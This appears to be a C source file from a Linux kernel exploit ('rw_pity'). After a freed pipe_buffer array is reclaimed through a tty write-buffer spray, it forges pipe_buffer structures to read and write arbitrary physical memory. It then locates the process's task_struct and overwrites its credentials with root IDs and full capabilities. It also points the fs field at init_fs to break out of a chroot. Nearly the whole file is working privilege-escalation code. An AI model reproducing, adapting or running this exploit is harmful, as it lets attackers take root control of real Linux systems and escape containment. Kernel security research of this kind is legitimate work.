#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

#include "../config.h"

#ifdef RW_PITY_DEBUG
#define DEBUG
#endif // RW_PITY_DEBUG

#include "errhandling.h"
#include "leaks.h"
#include "rw_pipe_and_tty.h"
#include "tty_write_stuff.h"
#include "utils.h"

#define READ 0
#define WRITE 1
#define PIPE_RING_SZ 16

static char* find_me = "find_me";

static int ptmx_fds[N_RW_PTMX];
static int n_ptmx_fds;

static int corrupted_pipe[2];
static int corrupting_tty;

struct my_pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t unused;
  uint64_t private;
};

static char default_fake_pipe_buffer[PIPE_RING_SZ
				     * sizeof(struct my_pipe_buffer)];

/* Call before using this module */
void rw_pity_init(void)
{
  CHECK_ZERO(init_tty_nonblock_suspended(ptmx_fds, N_RW_PTMX),
      "init_tty_nonblock_suspended");
  n_ptmx_fds = N_RW_PTMX;
  LOGI("Initialized %d tty for spraying "
       "tty->write_buf (%d, %d, %d, ... %d)\n",
      n_ptmx_fds, ptmx_fds[0],
      ptmx_fds[1], ptmx_fds[2], ptmx_fds[n_ptmx_fds - 1]);
}

/* Call after arbitrarily freeing an array of pipe_buffer to reclaim
 * it with the default_fake_pipe_buffer.
 */
void rw_pity_spray_tty_write_buf(void)
{
  spray_tty_write_buffers(ptmx_fds, n_ptmx_fds,
      (void*)default_fake_pipe_buffer,
      sizeof(default_fake_pipe_buffer));
}

/* Given a list of _fresh_ pipes, one of which has been arbitrarily
 * freed and reclaimed with an tty->write_buf, and a list of ttys,
 * one of which is the one that reclaimed the buffer, this function
 * identifies the pair of corrupted pipe and corrupting tty.
 * - if no ttys are given, the module's ones are used
 */
int rw_pity_identify_pair(int (*pipes)[2], int num_pipes,
    int* ttys, int n_ttys)
{
  int var = 0;
  struct my_pipe_buffer* fake_pipe_buffers = NULL;
  int ret = -1;

  if (!ttys) {
    ttys = ptmx_fds;
    n_ttys = n_ptmx_fds;
  }

  // populate the first pipe_buffer to advance pipe->head by one
  for (int i = 0; i < num_pipes; i++) {
    CHECK_POS(write(pipes[i][WRITE], &var, 1),
	"write: pipe");
  }

  // corrupt the first pipe_buffer
  CHECK_PTR(fake_pipe_buffers = calloc(PIPE_RING_SZ,
		sizeof(struct my_pipe_buffer)),
      "calloc: fake_pipe_buffers");
  for (int i = 0; i < n_ttys; i++) {
    fake_pipe_buffers[0].len = (uint32_t)(1337 + i);
    update_tty_write_buffer(ttys[i], (void*)fake_pipe_buffers,
	16 * sizeof(struct my_pipe_buffer));
  }

  // read back the amount of data available in the pipe, it will be
  // 1337 + "idx of corrupting tty" for the corrupted pipe, one for all
  // the others
  // https://elixir.bootlin.com/linux/v5.10.127/source/fs/pipe.c#L612
  int bytes_to_read = -1;
  for (int i = 0; i < num_pipes; i++) {
    CHECK_SYS(ioctl(pipes[i][READ], FIONREAD, &bytes_to_read),
	"ioctl: get bytes in pipe");
    if (bytes_to_read != 1) {
      corrupted_pipe[READ] = pipes[i][READ];
      corrupted_pipe[WRITE] = pipes[i][WRITE];
      corrupting_tty = ttys[bytes_to_read - 1337];
      LOGS("Pipe #%d with fd %d,%d was "
	   "corrupted by tty #%d with fd %d\n",
	  i, corrupted_pipe[READ], corrupted_pipe[WRITE],
	  bytes_to_read - 1337, corrupting_tty);
      ret = 0;
      break;
    }
  }

  if (ret) {
    LOGE("Failed to corrupt the arbitrarily freed pipe with a "
	 "tty->write_buf");
  }

  free(fake_pipe_buffers);

  return ret;
}

uint64_t rw_pity_read_qword(uint64_t paddr)
{
  void* leak = NULL;
  uint64_t aligned_paddr = PAGE_ALIGN(paddr);
  uint64_t ret;

  RW_PITY_CHECK_RW_PTR(paddr, sizeof(uint64_t));

  leak = rw_pity_read_phys_page(aligned_paddr, NULL);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wcast-align"
  ret = *(uint64_t*)((char*)leak + paddr - aligned_paddr);
#pragma clang diagnostic pop

  free(leak);

  return ret;
}

void rw_pity_write(uint64_t paddr, size_t len, void* buf)
{
  struct my_pipe_buffer* fake_pipe_buffers = NULL;
  uint64_t aligned_paddr = PAGE_ALIGN(paddr);
  ssize_t bytes_written = 0;

  RW_PITY_CHECK_RW_PTR(paddr, len);

  CHECK_PTR(fake_pipe_buffers = calloc(1,
		sizeof(struct my_pipe_buffer)),
      		"calloc: fake_pipe_buffer");

  // pretend that there is a page filled up to the offset we want to
  // write, and that it is OK to append data
  fake_pipe_buffers->page = PADDR_2_PAGE(aligned_paddr);
  fake_pipe_buffers->len = (uint32_t)(paddr - aligned_paddr);
  fake_pipe_buffers->ops = kernel_base + ANON_PIPE_BUF_OPS;
  fake_pipe_buffers->flags = PIPE_BUF_FLAG_CAN_MERGE;

  LOGI("Writing %lu bytes to 0x%lx", len, paddr);
  LOGI("fake_pipe_buffers->page = %lx", fake_pipe_buffers->page);
  LOGI("fake_pipe_buffers->len = %x", fake_pipe_buffers->len);
  LOGI("fake_pipe_buffers->ops = %lx", fake_pipe_buffers->ops);
  HEXDUMPI(buf, len);

  update_tty_write_buffer(corrupting_tty,
      (void*)fake_pipe_buffers,
      sizeof(struct my_pipe_buffer));

  bytes_written = write(corrupted_pipe[WRITE], buf,len);

  LOGI("Wrote %ld bytes to pipe", bytes_written);

  assert(bytes_written == (ssize_t)len);

  free(fake_pipe_buffers);
}

/*
 * - paddr must be page aligned
 * - leak is an optional output buffer and will be returned if provided
 * - caller is responsible to free returned pointer
 */
void* rw_pity_read_phys_page(uint64_t paddr, void* leak)
{
  struct my_pipe_buffer* fake_pipe_buffers = NULL;
  ssize_t bytes_read = 0;

  CHECK_PTR(fake_pipe_buffers = calloc(1,
		sizeof(struct my_pipe_buffer)),
      		"calloc: fake_pipe_buffer");

  if (!leak) {
    CHECK_PTR(leak = calloc(1, PAGE_SZ), "calloc: leak buffer");
  }

  // pretend that there is a page full of data to read
  fake_pipe_buffers->page = PADDR_2_PAGE(paddr);
  fake_pipe_buffers->len = PAGE_SZ;
  fake_pipe_buffers->ops = kernel_base + ANON_PIPE_BUF_OPS;

  LOGD("Reading one page of physical memory at 0x%lx", paddr);
  HEXDUMPD((void*)fake_pipe_buffers,
      sizeof(struct my_pipe_buffer));
  LOGD("fake_pipe_buffer->page = %lx", PADDR_2_PAGE(paddr));
  LOGD("fake_pipe_buffer->len = %lx", PAGE_SZ);
  LOGD("fake_pipe_buffer->ops = %lx", kernel_base + ANON_PIPE_BUF_OPS);

  update_tty_write_buffer(corrupting_tty,
      (void*)fake_pipe_buffers,
      sizeof(struct my_pipe_buffer));

  // read one byte less than PAGE_SZ to avoid having to deal with the
  // read advancing pipe->tail
  bytes_read = read(corrupted_pipe[READ], leak,
      PAGE_SZ - 1);

  LOGD("Read %ld bytes from pipe", bytes_read);
  HEXDUMPD(leak, 64);
  HEXDUMPD((void*)((uint64_t)leak + PAGE_SZ - 64), 64);

  assert(bytes_read == (PAGE_SZ - 1));

  free(fake_pipe_buffers);

  return leak;
}

uint64_t rw_pity_scan_physmem_range(uint64_t paddr, uint64_t len,
    void* needle_buf, uint64_t needle_buf_sz, uint64_t align, int dir,
    bool (*validate_match)(uint64_t))
{
  void* leak = NULL;
  long offset = -1;
  long start = (long)PAGE_ALIGN(paddr);
  long n_pages = (long)(len / PAGE_SZ);
  long step = dir > 0 ? (long)PAGE_SZ : -(long)PAGE_SZ;
  long end = start + n_pages * step;
  long current = dir > 0 ? start : start - (long)PAGE_SZ;

  CHECK_PTR(leak = calloc(1, PAGE_SZ), "calloc: leak buffer");

  LOGI("Scanning physical memory from 0x%lx to 0x%lx for pattern:",
      start, end);
  HEXDUMPI(needle_buf, needle_buf_sz);

  for (int i = 0; i < n_pages; i++, current += step) {
    if (!(PADDR_2_PFN(current) & 0x1FF)) {
      LOGI("Progress: %lx", current);
    }
    rw_pity_read_phys_page((uint64_t)current, leak);
    offset = leak_scan_buffer(leak, PAGE_SZ,
	needle_buf, needle_buf_sz, align);
    if (offset > -1) {
      LOGI("Found needle on page 0x%lx at offset %ld", current, offset);
      HEXDUMPD(leak, PAGE_SZ);
      if (validate_match && validate_match((uint64_t)(current + offset))) {
	break;
      }
      // fixme: we skip the whole page if we found an invalid match...
      offset = -1;
    }
  }

  free(leak);

  return offset > -1 ? (uint64_t)(current + offset) : ULONG_MAX;
}

/* Receives physical address of an instance of our process' `comm`
 * string. Performs some heuristics to check if there is really our
 * task_struct at this address.
 */
static bool rw_pity_validate_task_struct_comm(uint64_t paddr)
{
  // comm will be on first page of task_struct
  uint64_t task_struct = paddr - TASK_STRUCT_COMM_OFFSET;

  if (task_struct & TASK_STRUCT_ALIGN) {
    LOGI("Match is at %lx not in a task_struct: unexpected alignment",
	task_struct);
    return false;
  }

  LOGI("Match is at %lx is likely a valid task_struct", task_struct);
  return true;
}

/* Given a valid _direct map_ address, it scans the surrounding
 * physical memory for our task struct and returns its _direct map_
 * address, or ULONG_MAX if it was not found.
 * - usually the address will be that of some heap object and we _hope_
 *   that the slab holding our task_struct is not too far away
 */
uint64_t rw_pity_search_my_task_struct(uint64_t heap_ptr)
{
  uint64_t task_struct;
  uint64_t paddr = PAGE_ALIGN(DIR_2_PADDR(heap_ptr));

  // change name to avoid finding some stale task struct of a dead
  // thread
  CHECK_SYS(prctl(PR_SET_NAME, find_me, 0, 0, 0), "prctl: set name");

  // scan 1 GiB of memory before and after the address
  task_struct = rw_pity_scan_physmem_range(paddr,
      MIN(SZ_1G, paddr), find_me,
      strlen(find_me), 0, -1,
      rw_pity_validate_task_struct_comm);

  if (task_struct == ULONG_MAX) {
    task_struct = rw_pity_scan_physmem_range(paddr,
	SZ_1G, find_me,
	strlen(find_me), 0, 1,
	rw_pity_validate_task_struct_comm);
  }

  if (task_struct != ULONG_MAX) {
    task_struct -= TASK_STRUCT_COMM_OFFSET;
    task_struct = PADDR_2_DIR(task_struct);
    LOGD("Found my task_struct@%lx", task_struct);
  }

  return task_struct;
}

/* overwrites uid, gid, euid, egid, and all capability sets
 * - input is _direct map_ address of the task_struct to edit
 */
void rw_pity_privesc_creds(uint64_t task_struct)
{
  uint64_t paddr_ts = DIR_2_PADDR(task_struct);
  uint64_t paddr_cred = DIR_2_PADDR(rw_pity_read_qword(
    			paddr_ts + task_struct_offsets.cred));
  void* fake_ids = NULL;
  uint64_t fake_ids_size = cred_offsets.securebits - cred_offsets.uid;
  uint64_t* fake_caps = NULL;
  uint64_t fake_caps_size = cred_offsets.jit_keyring
    			    - cred_offsets.cap_inheritable;

  LOGI("Editing creds@0x%lx of task_struct@%lx", paddr_cred, paddr_ts);

  CHECK_PTR(fake_ids = calloc(1, fake_ids_size), "calloc");
  CHECK_PTR(fake_caps = calloc(1, fake_caps_size), "calloc");

  for (unsigned int i = 0; i < fake_caps_size / sizeof(uint64_t); i++) {
    fake_caps[i] = FULL_CAPS;
  }

  rw_pity_write(paddr_cred + cred_offsets.uid,
      fake_ids_size, fake_ids);
  rw_pity_write(paddr_cred + cred_offsets.cap_inheritable,
      fake_caps_size, fake_caps);
}

/* task_struct->fs = &init_fs to undo a chroot
 * - input is _direct map_ address of the task_struct to edit
 */
void rw_pity_privesc_fs(uint64_t task_struct)
{
  uint64_t paddr_ts = DIR_2_PADDR(task_struct);
  uint64_t init_fs = kernel_base + RW_PITY_INIT_FS;

  LOGI("Setting `fs` of task_struct@0x%lx to init_fs@0x%lx",
      paddr_ts, init_fs);

  rw_pity_write(paddr_ts + task_struct_offsets.fs,
      sizeof(init_fs), &init_fs);
}
